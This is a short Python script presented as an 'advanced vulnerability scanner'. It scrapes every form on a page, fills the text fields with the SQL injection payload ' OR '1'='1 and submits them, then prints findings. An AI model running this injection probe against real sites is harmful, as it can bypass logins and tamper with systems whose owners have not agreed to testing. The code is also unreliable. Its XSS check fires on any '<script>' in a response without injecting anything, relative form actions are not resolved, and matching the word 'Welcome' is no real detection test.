from bs4 import BeautifulSoup
import requests

# Advanced vulnerability scanner
def advanced_scan(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form')
    
    for form in forms:
        action = form.get('action')
        method = form.get('method', 'get').lower()
        inputs = form.find_all('input')
        
        data = {}
        for input in inputs:
            name = input.get('name')
            if input.get('type') == 'text':
                data[name] = "' OR '1'='1"
        
        if method == 'post':
            form_response = requests.post(action, data=data)
        else:
            form_response = requests.get(action, params=data)
        
        if "Welcome" in form_response.text:
            print(f"SQL Injection vulnerability detected in form {action}")
        if "<script>" in form_response.text:
            print(f"XSS vulnerability detected in form {action}")

advanced_scan("https://www.example.com")
